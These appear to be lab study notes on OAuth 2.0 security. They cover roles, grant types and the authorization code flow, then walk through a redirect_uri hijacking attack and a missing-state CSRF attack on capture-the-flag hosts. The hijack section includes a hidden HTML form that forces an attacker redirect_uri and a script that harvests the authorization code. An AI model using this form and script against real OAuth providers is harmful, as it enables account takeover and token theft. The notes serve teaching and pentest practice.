OAuth 2.0 is the commonly used authorisation framework / **authorization framework** that allows applications to access user data **without sharing user passwords**. Understanding these roles is critical for finding OAuth misconfigurations and vulnerabilities. which allows for CSRF, XSS, data leakage and exploitation of other vulnerabilities.

As a pentester or a secure coder, it is essential to understand these concepts to pentest a website or write code without a vulnerability. To make these concepts more relatable, we will explain them through a daily routine example: using a coffee shop's mobile app to order and pay for coffee.
### 1. Resource Owner

- The **user** who owns the data and can grant permission.
- Controls consent and access.
- **Example:** You, the coffee shop customer, who owns your account and payment data.
### 2. Client

- The **application** requesting access to user data.
- Can be a web app, mobile app, or backend service.
- **Example:** Coffee shop mobile/web app used to order coffee.
### 3. Authorization Server

- Authenticates the resource owner.
- Issues **access tokens** after user consent.
- **Example:** Coffee shop backend handling login and permissions.
### 4. Resource Server

- Hosts **protected resources** (data).
- Validates access tokens before serving data.
- **Example:** Database storing orders, account info, and payments.
### 5. Authorization Grant

- Proof that the user authorized the client.
- Used to obtain an access token.
- Common types:
    - Authorization Code (most secure)
    - Implicit (legacy, risky)
    - Password Credentials (dangerous)
    - Client Credentials (machine-to-machine)
- **Example:** Login approval given when you sign into the app.
### 6. Access Token

- Short-lived credential used to access APIs.
- Has **scope** and expiration.
- Prevents repeated password use.
- **Example:** Token allowing the app to place orders for you.
### 7. Refresh Token

- Used to get a **new access token** without re-login.
- Long-lived → high-value target in attacks.
- **Example:** Keeps you logged in after token expiry.
### 8. Redirect URI

- Pre-registered URL where the authorization server redirects the user.
- Prevents token leakage and phishing.
- **Example:** App page you return to after login.
### 9. Scope

- Defines **what actions/data** the client can access.
- Enforces least privilege.
- **Example:** `read:orders`, `write:payments`
### 10. State Parameter

- Protects against **CSRF attacks**.
- Must be unpredictable and validated.
- **Example:** Random value sent during login and checked on return.
### 11. Authorization Endpoint vs Token Endpoint

- **Authorization Endpoint**
    - User login + consent
- **Token Endpoint**
    - Exchange grant/refresh token → access token

---
## OAuth 2.0 Grant Types

OAuth 2.0 defines **grant types** that specify how a client application obtains an **access token** to access protected resources.
### 1. Authorization Code Grant

- **Most secure and widely used**
- Designed for **server-side applications** (PHP, Java, .NET, etc.)
- Flow:
    - User authenticates on the authorization server
    - Server returns an **authorization code**
    - Client exchanges the code for an **access token** (server-to-server)
- **Access token is never exposed to the browser**
- Supports **refresh tokens**
- **Best choice for web applications**

---
### 2. Implicit Grant

- Designed for **browser-based and mobile apps**
- Access token is returned **directly in the URL fragment**
- No authorization code exchange
- **Faster but less secure**
- ❌ Access token exposed to browser and history
- ❌ No refresh token support
- **Now considered deprecated** in modern OAuth implementations

---
### 3. Resource Owner Password Credentials Grant

- Used only for **highly trusted (first-party) applications**
- User provides **username and password directly to the client**
- Client exchanges credentials for an access token
- Simple and direct flow
- ❌ Less secure (credentials shared with client)
- ❌ Not suitable for third-party apps

---
### 4. Client Credentials Grant

- Used for **server-to-server communication**
- No user involvement
- Client authenticates using **client ID and client secret**
- Authorization server returns an access token
- Ideal for **backend services, APIs, microservices**
- **No user data exposure**

---
## OAuth 2.0 Authorization Code Flow (Workflow Notes)

OAuth 2.0 allows a user to log in to one application using another trusted application (OAuth provider) **without sharing passwords**.
### Key Roles

- **Resource Owner**: User (e.g., Tom)
- **Client**: Third-party app requesting access (Bistro)
- **Authorization Server**: OAuth provider handling login & consent (CoffeeShopApp)
- **Resource Server**: Stores protected user data (CoffeeShopApp API)
## High-Level OAuth Flow

1. User requests login via OAuth
2. Client redirects user to Authorization Server
3. User logs in and gives consent
4. Authorization Server returns **authorization code**
5. Client exchanges code for **access token**
6. Client uses access token to access protected resources

---
### Step-by-Step OAuth Workflow (CoffeeShopApp Example)

### 1. Authorization Request

- User visits **Bistro** and clicks _Login with OAuth_
- Bistro redirects the user to **CoffeeShopApp (Authorization Server)**

**Important parameters sent:**

- `response_type=code` → expects authorization code
- `client_id` → identifies Bistro app
- `redirect_uri` → where user is sent after approval
- `scope` → permissions requested
- `state` → CSRF protection token

✔ Purpose: Tell the authorization server **who is requesting access and what they want**

---
### 2. Authentication & User Consent

- User logs in on CoffeeShopApp
- Authorization server verifies credentials
- User sees a **consent screen**
- User allows or denies access

✔ Purpose:

- Authenticate the user
- Get **explicit permission** before sharing data

---
### 3. Authorization Response

- If user approves, authorization server redirects back to Bistro
- Redirect contains:
    - `code` → authorization code
    - `state` → to verify request integrity

```
https://bistro.thm:8000/callback?code=AUTH_CODE&state=XYZ
```

✔ Authorization code is **temporary and single-use**

---
### 4. Token Request

- Bistro sends a **POST request** to the token endpoint
- Exchanges authorization code for access token

**Required parameters:**

- `grant_type=authorization_code`
- `code` → authorization code
- `redirect_uri`
- `client_id`
- `client_secret`

✔ This step is **server-to-server**, keeping tokens hidden from browsers

---
### 5. Token Response

- Authorization server validates request
- Returns:
    - `access_token`
    - `token_type` (Bearer)
    - `expires_in`
    - `refresh_token` (optional)

✔ Access token is the **key** to protected resources

---
### Identifying OAuth Usage in an Application

OAuth is commonly used for **third-party authentication and authorization**. Recognizing its presence is the first step in testing for OAuth-related vulnerabilities.

### 1. Indicators of OAuth Usage

### Login Page Clues

- Look for login options such as:
    - _Login with Google_
    - _Login with Facebook_
    - _Login with GitHub_
- These buttons usually redirect users to an **external authorization server**
- This redirection is a strong indicator that **OAuth is being used**

✔ Rule of thumb:  
If login redirects to another domain → **OAuth likely in use**

---
### 2. Detecting OAuth via Network Traffic

### HTTP Redirect Analysis

- Use browser DevTools or Burp Suite
- Observe **302 / 301 redirects** during login
### Common OAuth Parameters in URLs

If the redirected URL contains these parameters, OAuth is almost certainly being used:

- `response_type`
- `client_id`
- `redirect_uri`
- `scope`
- `state`
### Example OAuth Authorization URL

```
https://dev.coffee.thm/authorize?
response_type=code
&client_id=AppClientID
&redirect_uri=https://dev.coffee.thm/callback
&scope=profile
&state=xyzSecure123
```

✔ These parameters define an OAuth authorization request

---
## 3. Identifying the OAuth Framework Used

Knowing the framework helps predict **misconfigurations and known weaknesses**.

### a) HTTP Headers & Responses

- Inspect response headers and body
- Look for:
    - Framework names
    - Comments or debug info
    - Unique header values
### b) Source Code Analysis

If source code is accessible:

- Search for keywords and imports such as:
    - `django-oauth-toolkit`
    - `oauthlib`
    - `spring-security-oauth`
    - `passport` (Node.js)

✔ Framework names often appear in imports, configs, or comments

### c) Authorization & Token Endpoints

Different frameworks use recognizable endpoint patterns:

|Framework|Common Endpoints|
|---|---|
|Django OAuth Toolkit|`/oauth/authorize/`, `/oauth/token/`|
|Generic OAuth|`/authorize`, `/token`|
|Custom Implementations|Non-standard paths|
✔ Endpoint structure can fingerprint the OAuth library

### d) Error Messages & Debug Output

- Trigger errors intentionally (invalid redirect_uri, missing state)
- Look for:
    - Stack traces
    - Library names
    - Framework-specific error formats

⚠ Verbose errors may leak:

- OAuth framework
- Backend language
- Configuration details

---
### Stealing OAuth Tokens & Redirect_URI Vulnerability

### Role of Tokens in OAuth 2.0

- Tokens act as **digital keys** to access protected resources
- Issued by the **Authorization Server**
- Sent to the **Client** via the `redirect_uri`
- If tokens are intercepted → **account takeover**

✔ Security of OAuth heavily depends on **redirect_uri validation**

### Role of `redirect_uri`

- `redirect_uri` tells the authorization server **where to send the authorization code or token**
- Must be **pre-registered** in the OAuth provider settings
- Server checks:
    - Provided `redirect_uri` == one of the registered URIs

✔ Proper validation prevents:

- Open redirects
- Token leakage
- OAuth hijacking

### Vulnerability: Insecure Redirect_URI

If `redirect_uri` validation is weak or misconfigured:

- Attacker can **control where the authorization code is sent**
- Tokens may be redirected to **attacker-controlled domains**
### Impact

- Authorization code theft
- Access token compromise
- Full account takeover

### Attack Scenario (Concept)

### Preconditions

- Attacker controls a domain/subdomain listed or accepted in `redirect_uri`
- OAuth server does not strictly validate redirect URI

Attack Flow (Step-by-Step)

##### 1. Attacker Controls a Redirect Domain

```
http://dev.bistro.thm:8002/
```

##### 2. Attacker Crafts a Malicious OAuth Request

Attacker forces a **fake redirect_uri** using a hidden parameter:

```
<form action="http://coffee.thm:8000/oauthdemo/oauth_login/" method="get">
  <input type="hidden" name="redirect_uri"
         value="http://dev.bistro.thm:8002/malicious_redirect.html">
  <input type="submit" value="Hijack OAuth">
</form>
```

✔ Victim sees a normal “Login via OAuth” button

##### 3. Victim Authorizes the App

- Victim logs in to OAuth provider
- Authorization server redirects **authorization code** to attacker’s domain

```
http://dev.bistro.thm:8002/malicious_redirect.html?code=VRIHINF366aUPSAgtNUAkdcA8h5mKD
```
##### 4. Attacker Intercepts Authorization Code

Attacker-controlled page extracts the code:

```
<script>
  const params = new URLSearchParams(window.location.search);
  const code = params.get('code');
  console.log("Intercepted Authorization Code:", code);
</script>
```

✔ Victim does not notice the interception  
✔ Redirect happens very fast

##### 5. Attacker Exchanges Code for Access Token

Attacker uses the stolen code:

```
http://bistro.thm:8000/oauthdemo/callbackforflag/?code=VRIHINF366aUPSAgtNUAkdcA8h5mKD

Response:

{"access_token": "cwBIxQCIUZO0D90aPT6JaSUGRiburW", "expires_in": 36000, "token_type": "Bearer", "scope": "read write", "refresh_token": "Xtt3vM8pIxTxrjTX5z3nvq7D5IaD6G", "flag": "THM{GOT_THE_TOKEN007}"}
```

---
### OAuth `state` Parameter & CSRF Vulnerability

### Purpose of the `state` Parameter

- The `state` parameter protects OAuth flows from **CSRF (Cross-Site Request Forgery)**
- It binds:
    - **Authorization request**
    - **Authorization response**
- Ensures the OAuth response belongs to the same user/session that initiated the request

✔ Without `state`, OAuth flow integrity is broken

### How `state` Works (Normal Flow)

1. Client generates a **random, unpredictable state value**
2. Sends it with the authorization request
3. Authorization server returns the **same state**
4. Client verifies:

```
sent_state == received_state
```

✔ If they match → request is valid  
❌ If missing/mismatched → request is rejected

##### Vulnerability: Missing or Weak `state`

### Weak `state` Examples

- Missing entirely
- Static value (e.g., `state=state`)
- Predictable values (1, 2, 3…)
- Not validated on callback
### Why This Is Dangerous

- Authorization server cannot distinguish:
    - Attacker’s OAuth request
    - Victim’s OAuth request
- Leads to **OAuth CSRF attacks**

### Attack Concept (OAuth CSRF)

Without `state`:

- Attacker can reuse their own authorization code
- Trick victim into executing OAuth callback
- Victim unknowingly links attacker’s OAuth account

✔ No user interaction required beyond clicking a link

